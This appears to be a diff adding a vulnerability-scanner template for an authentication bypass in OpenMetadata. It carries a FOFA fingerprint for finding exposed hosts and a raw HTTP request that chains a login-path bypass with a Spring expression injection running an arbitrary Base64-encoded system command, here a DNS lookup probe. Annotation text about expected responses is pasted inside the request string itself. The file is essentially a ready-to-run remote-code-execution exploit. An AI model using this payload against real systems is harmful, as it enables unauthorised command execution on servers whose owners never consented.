@@ -1,0 +1,40 @@
+id: poc-zo1tfxvi0164ozek
+info:
+  name: OpenMetadata 中的身份验证绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zo1tfxvi0164ozek'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zo1tfxvi0164ozek
+    fofa: icon_hash="733091897"
+http:
+- raw:
+  - 'GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22bnNsb29rdXAgd3d3LmJhaWR1LmNvbQ==%22))) HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    400
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 400
+    type: status
